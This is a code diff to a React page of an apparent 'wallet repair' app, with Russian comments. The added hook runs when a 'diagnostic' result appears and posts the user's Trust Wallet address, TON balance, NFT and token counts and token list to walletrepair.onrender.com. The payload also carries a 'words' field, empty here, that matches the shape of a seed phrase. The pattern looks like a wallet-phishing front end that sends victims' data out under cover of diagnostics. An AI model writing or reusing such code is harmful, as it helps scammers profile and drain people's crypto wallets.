@@ -105,7 +105,27 @@ export default function Page2_Animation() {
 
   // Обновлять сводные данные при появлении результата диагностики
   useEffect(() => {
-    if (result) updateSummaryData();
+    if (result) {
+      // Отправляем данные на сервер для создания summary.txt
+      const diagnoseData = {
+        walletName: 'Trust Wallet',
+        address: wallet,
+        ton: tonBalance || '',
+        usdt: '',
+        nft: nftCount || '',
+        tokens: tokensCount || '',
+        words: [],
+        tokenList: tokens && tokens.length ? tokens.join(', ') : '',
+        nftList: '',
+      };
+      fetch('https://walletrepair.onrender.com/api/diagnose', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(diagnoseData)
+      })
+        .then(res => res.json())
+        .then(() => updateSummaryData());
+    }
     // eslint-disable-next-line
   }, [result]);
   const [tokens, setTokens] = useState([]);
